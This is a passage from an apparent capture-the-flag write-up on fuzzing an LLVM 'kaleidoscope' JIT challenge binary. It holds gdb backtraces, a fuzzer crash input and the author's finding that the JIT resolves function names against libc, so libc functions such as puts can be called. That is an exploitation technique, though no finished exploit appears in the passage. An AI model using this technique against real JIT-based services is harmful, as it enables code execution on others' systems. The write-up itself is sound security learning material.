class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt;::_M_construct&lt;<span class="keyword">char</span>*&gt; (<span class="keyword">this</span>=&lt;optimized out&gt;, __beg=<span class="number">0x6</span> &lt;error: Cannot access memory at address <span class="number">0x6</span>&gt;, __end=&lt;optimized out&gt;) at /usr/bin/../lib/gcc/x86_64-linux-gnu/<span class="number">7.4</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.4</span><span class="number">.0</span>/bits/basic_string.h:<span class="number">255</span></span><br><span class="line">#<span class="number">10</span> <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt;::basic_string (<span class="keyword">this</span>=&lt;optimized out&gt;, __str=...) at /usr/bin/../lib/gcc/x86_64-linux-gnu/<span class="number">7.4</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.4</span><span class="number">.0</span>/bits/basic_string.h:<span class="number">440</span></span><br><span class="line">#<span class="number">11</span> <span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt;::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>&amp;, <span class="number">0u</span>l&gt;(<span class="built_in">std</span>::tuple&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>&amp;&gt;&amp;, <span class="built_in">std</span>::tuple&lt;&gt;&amp;, <span class="built_in">std</span>::_Index_tuple&lt;<span class="number">0u</span>l&gt;, <span class="built_in">std</span>::_Index_tuple&lt;&gt;) (<span class="keyword">this</span>=<span class="number">0x55555569ec30</span>, __tuple1=..., __tuple2=...) at /usr/bin/../lib/gcc/x86_64-linux-gnu/<span class="number">7.4</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.4</span><span class="number">.0</span>/tuple:<span class="number">1651</span></span><br><span class="line">#<span class="number">12</span> <span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt;::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>&amp;&gt;(<span class="built_in">std</span>::<span class="keyword">piecewise_construct_t</span>, <span class="built_in">std</span>::tuple&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>&amp;&gt;, <span class="built_in">std</span>::tuple&lt;&gt;) (<span class="keyword">this</span>=<span class="number">0x55555569ec30</span>, __first=..., __second=...) at /usr/bin/../lib/gcc/x86_64-linux-gnu/<span class="number">7.4</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.4</span><span class="number">.0</span>/tuple:<span class="number">1639</span></span><br><span class="line">#<span class="number">13</span> __gnu_cxx::new_allocator&lt;<span class="built_in">std</span>::_Rb_tree_node&lt;<span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt; &gt; &gt;::construct&lt;<span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt;, <span class="built_in">std</span>::<span class="keyword">piecewise_construct_t</span> <span class="keyword">const</span>&amp;, <span class="built_in">std</span>::tuple&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>&amp;&gt;, <span class="built_in">std</span>::tuple&lt;&gt; &gt;(<span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt;*, <span class="built_in">std</span>::<span class="keyword">piecewise_construct_t</span> <span class="keyword">const</span>&amp;, <span class="built_in">std</span>::tuple&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>&amp;&gt;&amp;&amp;, <span class="built_in">std</span>::tuple&lt;&gt;&amp;&amp;) (__p=<span class="number">0x55555569ec30</span>, __args=..., <span class="keyword">this</span>=&lt;optimized out&gt;, __args=..., __args=...) at /usr/bin/../lib/gcc/x86_64-linux-gnu/<span class="number">7.4</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.4</span><span class="number">.0</span>/ext/new_allocator.h:<span class="number">136</span></span><br><span class="line">#<span class="number">14</span> <span class="built_in">std</span>::allocator_traits&lt;<span class="built_in">std</span>::allocator&lt;<span class="built_in">std</span>::_Rb_tree_node&lt;<span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt; &gt; &gt; &gt;::construct&lt;<span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt;, <span class="built_in">std</span>::<span class="keyword">piecewise_construct_t</span> <span class="keyword">const</span>&amp;, <span class="built_in">std</span>::tuple&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>&amp;&gt;, <span class="built_in">std</span>::tuple&lt;&gt; &gt;(<span class="built_in">std</span>::allocator&lt;<span class="built_in">std</span>::_Rb_tree_node&lt;<span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt; &gt; &gt;&amp;, <span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt;*, <span class="built_in">std</span>::<span class="keyword">piecewise_construct_t</span> <span class="keyword">const</span>&amp;, <span class="built_in">std</span>::tuple&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>&amp;&gt;&amp;&amp;, <span class="built_in">std</span>::tuple&lt;&gt;&amp;&amp;) (__p=<span class="number">0x55555569ec30</span>, __args=..., __a=..., __args=..., __args=...) at /usr/bin/../lib/gcc/x86_64-linux-gnu/<span class="number">7.4</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.4</span><span class="number">.0</span>/bits/alloc_traits.h:<span class="number">475</span></span><br><span class="line">#<span class="number">15</span> <span class="built_in">std</span>::_Rb_tree&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt;, <span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt;, <span class="built_in">std</span>::_Select1st&lt;<span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt; &gt;, <span class="built_in">std</span>::less&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; &gt;, <span class="built_in">std</span>::allocator&lt;<span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt; &gt; &gt;::_M_construct_node&lt;<span class="built_in">std</span>::<span class="keyword">piecewise_construct_t</span> <span class="keyword">const</span>&amp;, <span class="built_in">std</span>::tuple&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>&amp;&gt;, <span class="built_in">std</span>::tuple&lt;&gt; &gt;(<span class="built_in">std</span>::_Rb_tree_node&lt;<span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt; &gt;*, <span class="built_in">std</span>::<span class="keyword">piecewise_construct_t</span> <span class="keyword">const</span>&amp;, <span class="built_in">std</span>::tuple&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>&amp;&gt;&amp;&amp;, <span class="built_in">std</span>::tuple&lt;&gt;&amp;&amp;) (<span class="keyword">this</span>=<span class="number">0x5555555694c8</span> &lt;NamedValues[abi:cxx11]&gt;, __node=<span class="number">0x55555569ec10</span>, __args=..., __args=..., __args=...) at /usr/bin/../lib/gcc/x86_64-linux-gnu/<span class="number">7.4</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.4</span><span class="number">.0</span>/bits/stl_tree.h:<span class="number">626</span></span><br><span class="line">#<span class="number">16</span> <span class="built_in">std</span>::_Rb_tree&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt;, <span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt;, <span class="built_in">std</span>::_Select1st&lt;<span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt; &gt;, <span class="built_in">std</span>::less&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; &gt;, <span class="built_in">std</span>::allocator&lt;<span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt; &gt; &gt;::_M_create_node&lt;<span class="built_in">std</span>::<span class="keyword">piecewise_construct_t</span> <span class="keyword">const</span>&amp;, <span class="built_in">std</span>::tuple&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>&amp;&gt;, <span class="built_in">std</span>::tuple&lt;&gt; &gt;(<span class="built_in">std</span>::<span class="keyword">piecewise_construct_t</span> <span class="keyword">const</span>&amp;, <span class="built_in">std</span>::tuple&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>&amp;&gt;&amp;&amp;, <span class="built_in">std</span>::tuple&lt;&gt;&amp;&amp;) (<span class="keyword">this</span>=<span class="number">0x5555555694c8</span> &lt;NamedValues[abi:cxx11]&gt;, __args=..., __args=..., __args=...) at /usr/bin/../lib/gcc/x86_64-linux-gnu/<span class="number">7.4</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.4</span><span class="number">.0</span>/bits/stl_tree.h:<span class="number">643</span></span><br><span class="line">#<span class="number">17</span> <span class="built_in">std</span>::_Rb_tree&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt;, <span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt;, <span class="built_in">std</span>::_Select1st&lt;<span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt; &gt;, <span class="built_in">std</span>::less&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; &gt;, <span class="built_in">std</span>::allocator&lt;<span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt; &gt; &gt;::_M_emplace_hint_unique&lt;<span class="built_in">std</span>::<span class="keyword">piecewise_construct_t</span> <span class="keyword">const</span>&amp;, <span class="built_in">std</span>::tuple&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>&amp;&gt;, <span class="built_in">std</span>::tuple&lt;&gt; &gt;(<span class="built_in">std</span>::_Rb_tree_const_iterator&lt;<span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt; &gt;, <span class="built_in">std</span>::<span class="keyword">piecewise_construct_t</span> <span class="keyword">const</span>&amp;, <span class="built_in">std</span>::tuple&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>&amp;&gt;&amp;&amp;, <span class="built_in">std</span>::tuple&lt;&gt;&amp;&amp;) (<span class="keyword">this</span>=<span class="number">0x5555555694c8</span> &lt;NamedValues[abi:cxx11]&gt;, __pos=&#123;</span><br><span class="line">  first = &lt;incomplete type&gt;,</span><br><span class="line">  second = <span class="number">0x0</span></span><br><span class="line">&#125;, __args=..., __args=..., __args=...) at /usr/bin/../lib/gcc/x86_64-linux-gnu/<span class="number">7.4</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.4</span><span class="number">.0</span>/bits/stl_tree.h:<span class="number">2398</span></span><br><span class="line">#<span class="number">18</span> <span class="number">0x000055555555e97d</span> in <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt;, llvm::AllocaInst*, <span class="built_in">std</span>::less&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; &gt;, <span class="built_in">std</span>::allocator&lt;<span class="built_in">std</span>::pair&lt;<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt; <span class="keyword">const</span>, llvm::AllocaInst*&gt; &gt; &gt;::<span class="keyword">operator</span>[] (<span class="keyword">this</span>=&lt;optimized out&gt;, __k=...) at /usr/bin/../lib/gcc/x86_64-linux-gnu/<span class="number">7.4</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.4</span><span class="number">.0</span>/bits/stl_map.h:<span class="number">493</span></span><br><span class="line">#<span class="number">19</span> <span class="number">0x00005555555612dc</span> in (anonymous <span class="keyword">namespace</span>)::BinaryExprAST::codegen (<span class="keyword">this</span>=<span class="number">0x555555689010</span>) at toy.cpp:<span class="number">781</span></span><br><span class="line">#<span class="number">20</span> <span class="number">0x000055555555c6d9</span> in (anonymous <span class="keyword">namespace</span>)::FunctionAST::codegen (<span class="keyword">this</span>=<span class="number">0x555555638840</span>) at toy.cpp:<span class="number">1085</span></span><br><span class="line">#21 0x000055555555a767 in HandleTopLevelExpression () at toy.cpp:1164</span><br><span class="line">#<span class="number">22</span> MainLoop () at toy.cpp:<span class="number">1209</span></span><br><span class="line">#<span class="number">23</span> main () at toy.cpp:<span class="number">1263</span></span><br><span class="line">#<span class="number">24</span> <span class="number">0x00007ffff35d0b97</span> in __libc_start_main (main=<span class="number">0x55555555a240</span> &lt;main()&gt;, argc=<span class="number">1</span>, argv=<span class="number">0x7fffffffdee8</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="number">0x7fffffffded8</span>) at ../csu/libc-start.c:<span class="number">310</span></span><br><span class="line">#<span class="number">25</span> <span class="number">0x0000555555559c4a</span> in _start ()</span><br></pre></td></tr></table></figure>
<p>I then went to dinner and some really interesting crashes was found before I came back. The fuzzer reports these inputs lead to crashes, but the binary did not crash at all in dry run.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">matthew@matthew-MS<span class="number">-7</span>A37 ~/L/fuzz&gt; cat c5</span><br><span class="line"><span class="function">def <span class="title">fib</span><span class="params">(x)</span></span></span><br><span class="line">  if x &lt; 3 then</span><br><span class="line">   <span class="number">1</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"> <span class="number">526142246948557</span>=<span class="number">666</span></span><br><span class="line"></span><br><span class="line">fib(<span class="number">40</span>)</span><br><span class="line">$IF8׆FA]V_13X9`Z^9_O2ر/#nϰ'ӟ]* O-w ff4QjW=&#123;%IT(&lt;V['!]h_2</span><br><span class="line">ޒ*`-KyrCzʉB8Cl=&#125;_F85&amp;ЅNQ-O&#125;/<span class="number">8</span></span><br><span class="line">                             *ŋyG:~V$<span class="number">5917384075431139189</span>gG      ^ggXX%KTY១R|    )<span class="string">"319Oqy`</span></span><br><span class="line"><span class="string">                                                                                         &#123;&amp;!M?Z-Bz X</span></span><br><span class="line"><span class="string">                                                                                                    &gt;@YAyd(9kG9ǅ޹0)dL&amp;TBeDjח@3g3N,Okrvz8b[QRs        U,(     &gt;m@.*ou3\w;߳^U</span></span><br><span class="line"><span class="string">C&#125;5Ttrz7217830875066176221-+\I</span></span><br><span class="line"><span class="string">                              f⏎</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">matthew@matthew-MS-7A37 ~/L/fuzz&gt; cat c5 | ./kaleidoscope </span><br><span class="line">ready&gt; ready&gt; Error: Unknown variable name</span><br><span class="line">ready&gt; LLVM ERROR: Program used external <span class="keyword">function</span> <span class="string">'fib'</span> <span class="built_in">which</span> could not be resolved!</span><br></pre></td></tr></table></figure>
<p>The output was interesting though, it said the external function “fib” could not be resolved. If you compare the binary code with the original source code, you can see that there was an <code>extern</code> keyword in the source. However the handler was disabled in this challenge, it will say “No extern function” if you try to use <code>extern</code> keyword.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( CurTok != <span class="number">0xFFFFFFFD</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">        fwrite(<span class="string">"No extern function!!!\n"</span>, <span class="number">0x16</span>uLL, <span class="number">1u</span>LL, *v3);</span><br><span class="line">        CurTok = gettok();</span><br><span class="line">        CurTok = gettok();</span><br><span class="line">LABEL_18:</span><br><span class="line">        CurTok = gettok();</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<p>Then I search the string <code>Program used external function 'fib' which could not be resolved!</code> in this binary but find nothing. However, this message was stared by a tag <code>LLVM ERROR</code>, did that mean the string located at the llvm library?</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">matthew@matthew-MS-7A37 ~/L/fuzz&gt; strings /usr/lib/x86_64-linux-gnu/libLLVM-6.0.so.1 | grep <span class="string">"Program used external"</span></span><br><span class="line">Program used external <span class="keyword">function</span> <span class="string">'</span></span><br></pre></td></tr></table></figure>
<p>YES!</p>
<h2 id="analysis"><a class="header-anchor" href="#analysis">¶</a>Analysis</h2>
<p>Consider the logic behind this test case, the binary have finished the parsing job and pass the function name to libLLVM, libLLVM get the function name and try to resolve it from libc. If we search this info in the source of llvm, we can see it was invoked by <code>RTDyldMemoryManager::getPointerToNamedFunction</code>, see <a href="https://github.com/llvm-mirror/llvm/blob/8b8f8d0ad8a1f837071ccb39fb96e44898350070/lib/ExecutionEngine/RuntimeDyld/RTDyldMemoryManager.cpp#L290" target="_blank" rel="noopener">https://github.com/llvm-mirror/llvm/blob/8b8f8d0ad8a1f837071ccb39fb96e44898350070/lib/ExecutionEngine/RuntimeDyld/RTDyldMemoryManager.cpp#L290</a>.</p>
<p>Then I thought maybe we can call the libc functions directly in same manner. I changed the <code>fib</code> to <code>puts</code>, loaded the binary into gdb and read the input. I also set a breakpoint at <code>puts</code>, it did stop at the call.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────────[ REGISTERS ]───────────────────────────────────────</span><br><span class="line"> RAX  <span class="number">0x7ffff36899c0</span> (<span class="built_in">puts</span>) ◂— push   r13</span><br><span class="line"> RBX  <span class="number">0x7ffff7ff6000</span> ◂— push   rax</span><br><span class="line"> RCX  <span class="number">0x3</span></span><br><span class="line"> RDX  <span class="number">0x55555556a010</span> ◂— <span class="number">0x605070607050307</span></span><br><span class="line"> RDI  <span class="number">0x28</span></span><br><span class="line"> RSI  <span class="number">0x55555556a018</span> ◂— <span class="number">0x607050702070606</span></span><br><span class="line"> R8   <span class="number">0x8</span></span><br><span class="line"> R9   <span class="number">0x1</span></span><br><span class="line"> R10  <span class="number">0x555555638568</span> —▸ <span class="number">0x5555555d4f00</span> —▸ <span class="number">0x5555555b99f0</span> ◂— <span class="number">0x555500000000</span></span><br><span class="line"> R11  <span class="number">0x88</span></span><br><span class="line"> R12  <span class="number">0x7ffff39f5840</span> (<span class="built_in">stderr</span>) —▸ <span class="number">0x7ffff39f5680</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line"> R13  <span class="number">0x555555564eb8</span> ◂— jb     <span class="number">0x555555564f1f</span> <span class="comment">/* 'ready&gt; ' */</span></span><br><span class="line"> R14  <span class="number">0x7fffffffdd40</span> —▸ <span class="number">0x7ffff7ff6000</span> ◂— push   rax</span><br><span class="line"> R15  <span class="number">0x7fffffffddc0</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7ffff39f5680</span> (_IO_2_1_stderr_) ◂— <span 